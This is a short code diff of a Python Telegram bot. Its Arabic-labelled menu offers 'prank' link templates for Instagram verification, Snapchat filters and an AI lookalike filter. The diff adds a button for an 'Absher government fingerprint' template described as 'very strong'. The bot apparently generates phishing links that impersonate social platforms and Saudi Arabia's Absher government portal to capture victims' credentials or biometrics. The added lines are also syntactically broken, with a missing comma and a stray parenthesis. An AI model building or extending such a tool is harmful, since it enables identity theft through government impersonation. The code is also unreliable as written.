@@ -417,6 +417,8 @@ def show_main_menu(chat_id):
         InlineKeyboardButton("📸 مقلب توثيق إنستغرام", callback_data="gen_instagram"),
         InlineKeyboardButton("👻 مقلب فلاتر سناب شات", callback_data="gen_snapchat"),
         InlineKeyboardButton("🧠 مقلب فلتر الشبيه بالـ AI (ناري)", callback_data="gen_ai_filter")
+        InlineKeyboardButton("🚨 مقلب بصمة أبشر الحكومي (قوي جداً)", callback_data="gen_absher")
+    )
     )
     bot.send_message(chat_id, "👑 **مرحباً بك في لوحة تحكم القوالب الذكية:**\nاختر نوع المقلب لتوليد الرابط فوراً:", reply_markup=markup)
 
